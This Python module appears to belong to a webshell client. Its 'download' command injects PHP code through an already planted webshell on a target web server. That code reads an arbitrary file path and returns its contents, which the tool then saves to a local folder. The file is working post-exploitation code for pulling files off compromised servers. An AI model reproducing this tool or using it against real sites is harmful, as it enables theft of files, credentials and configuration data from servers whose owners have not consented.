from libs.config import alias, color, gget
from libs.myapp import send
from os import path, makedirs


def get_php(web_file_path: str):
    return (
        """function download($fd){
if (!@file_exists($fd)) {die();}
$fileinfo = pathinfo($fd);
header("Content-type: application/x-" . $fileinfo["extension"]);
header("Content-Disposition: attachment; filename=" . $fileinfo["basename"]);
header("Content-Length: " . filesize($fd));
@readfile($fd);
}
download("%s");
"""
        % web_file_path
    )


@alias(True, func_alias="d", w="web_file_path", l="local_path")
def run(
    web_file_path: str, local_path: str = "",
):
    """
    download

    Download file(s) from website
    """
    php = get_php(web_file_path)
    res = send(f"{php}")
    content = res.r_content
    download_path = local_path or gget("webshell.download_path", "webshell")
    if len(content):
        file_name = path.split(web_file_path)[1]
        if not path.exists(download_path):
            makedirs(download_path)
        file_path = path.join(download_path, file_name)
        with open(file_path, "wb") as f:
            f.write(content)
        print(color.green(f"Downloaded file has been saved to {file_path}"))
    else:
        print(color.red("File not exist / Download error"))
